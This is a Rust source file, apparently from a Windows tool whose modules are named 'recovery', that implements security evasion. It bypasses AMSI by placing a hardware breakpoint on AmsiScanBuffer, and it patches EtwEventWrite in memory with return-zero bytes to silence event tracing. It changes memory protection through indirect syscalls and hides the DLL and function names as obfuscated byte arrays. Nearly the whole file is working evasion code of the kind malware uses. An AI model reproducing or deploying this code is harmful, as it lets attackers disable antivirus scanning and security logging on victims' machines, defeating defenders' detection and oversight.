use crate::recovery::helpers::obfuscation::{deobf, deobf_w};
use crate::recovery::settings::RecoveryControl;
use tracing::{debug, info};
use windows::Win32::System::LibraryLoader::{GetProcAddress, LoadLibraryW};
use windows::Win32::System::Memory::{
    PAGE_EXECUTE_READWRITE, PAGE_PROTECTION_FLAGS, VirtualProtect,
};
use windows::core::PCWSTR;

use crate::recovery::helpers::hw_breakpoints::enable_hw_breakpoint;
use crate::recovery::helpers::syscalls::{SyscallManager, indirect_syscall_5};

pub fn apply_evasion_techniques() {
    if !RecoveryControl::global().evasion_enabled() {
        debug!("evasion techniques are disabled");
        return;
    }

    info!("applying evasion and stealth techniques");

    let syscall_manager = match SyscallManager::new() {
        Ok(m) => Some(m),
        Err(e) => {
            debug!(error = ?e, "failed to initialize syscall manager");
            None
        }
    };

    if let Err(err) = bypass_amsi() {
        debug!(error = ?err, "AMSI bypass failed");
    } else {
        info!("AMSI bypass applied successfully via HW BP");
    }

    if let Err(err) = patch_etw(syscall_manager.as_ref()) {
        debug!(error = ?err, "ETW bypass failed");
    } else {
        info!("ETW bypass applied successfully");
    }
}

fn bypass_amsi() -> Result<(), Box<dyn std::error::Error>> {
    unsafe {
        // "amsi.dll"
        let amsi_name = deobf_w(&[0xBF, 0x45, 0xB8, 0x1C, 0x6E, 0x0E, 0x1F, 0x70]);
        let h_amsi = LoadLibraryW(PCWSTR(amsi_name.as_ptr()))?;
        if h_amsi.is_invalid() {
            return Err("failed to load amsi.dll".into());
        }

        // "AmsiScanBuffer"
        let func_name_str = deobf(&[
            0x9F, 0x45, 0xB8, 0x1C, 0x3C, 0x2E, 0x58, 0x71, 0x7B, 0x4A, 0xF7, 0xFA, 0x12, 0x12,
        ]);
        let func_name = format!("{}\0", func_name_str);
        let p_amsi_scan_buffer = GetProcAddress(h_amsi, windows::core::PCSTR(func_name.as_ptr()));

        let Some(p_address) = p_amsi_scan_buffer else {
            return Err("failed to find AmsiScanBuffer address".into());
        };

        if !enable_hw_breakpoint(p_address as usize) {
            return Err("failed to set hardware breakpoint for AMSI".into());
        }

        Ok(())
    }
}

fn patch_etw(syscalls: Option<&SyscallManager>) -> Result<(), Box<dyn std::error::Error>> {
    unsafe {
        // "ntdll.dll"
        let ntdll_name = deobf_w(&[0xB0, 0x5B, 0x77, 0xE3, 0x42, 0xD4, 0x19, 0x70, 0xA5]);
        let h_ntdll = LoadLibraryW(PCWSTR(ntdll_name.as_ptr()))?;
        if h_ntdll.is_invalid() {
            return Err("failed to load ntdll.dll".into());
        }

        // "EtwEventWrite"
        let func_name_str = deobf(&[
            0x9B, 0x5B, 0xA8, 0x3D, 0xE3, 0xEF, 0x9C, 0x6C, 0x8E, 0x40, 0xFB, 0x69, 0x12,
        ]);
        let func_name = format!("{}\0", func_name_str);
        let p_etw_event_write = GetProcAddress(h_ntdll, windows::core::PCSTR(func_name.as_ptr()));

        let Some(p_address) = p_etw_event_write else {
            return Err("failed to find EtwEventWrite address".into());
        };

        let patch: [u8; 3] = [0x33, 0xC0, 0xC3];

        apply_patch(p_address as _, &patch, syscalls)
    }
}

fn apply_patch(
    p_address: *mut std::ffi::c_void,
    patch: &[u8],
    syscalls: Option<&SyscallManager>,
) -> Result<(), Box<dyn std::error::Error>> {
    unsafe {
        let mut old_protect = PAGE_PROTECTION_FLAGS::default();
        let mut size = patch.len();
        let mut addr = p_address;

        if let Some(mgr) = syscalls {
            let status = indirect_syscall_5(
                mgr.nt_protect_virtual_memory_ssn,
                mgr.syscall_gadget,
                -1, // Current process
                &mut addr as *mut _ as isize,
                &mut size as *mut _ as isize,
                PAGE_EXECUTE_READWRITE.0 as isize,
                &mut old_protect.0 as *mut _ as isize,
            );
            if status != 0 {
                return Err(
                    format!("NtProtectVirtualMemory failed with status 0x{:X}", status).into(),
                );
            }
        } else {
            VirtualProtect(
                p_address,
                patch.len(),
                PAGE_EXECUTE_READWRITE,
                &mut old_protect,
            )?;
        }

        std::ptr::copy_nonoverlapping(patch.as_ptr(), p_address as *mut u8, patch.len());

        let mut temp = PAGE_PROTECTION_FLAGS::default();
        if let Some(mgr) = syscalls {
            indirect_syscall_5(
                mgr.nt_protect_virtual_memory_ssn,
                mgr.syscall_gadget,
                -1,
                &mut addr as *mut _ as isize,
                &mut size as *mut _ as isize,
                old_protect.0 as isize,
                &mut temp.0 as *mut _ as isize,
            );
        } else {
            VirtualProtect(p_address, patch.len(), old_protect, &mut temp)?;
        }

        Ok(())
    }
}
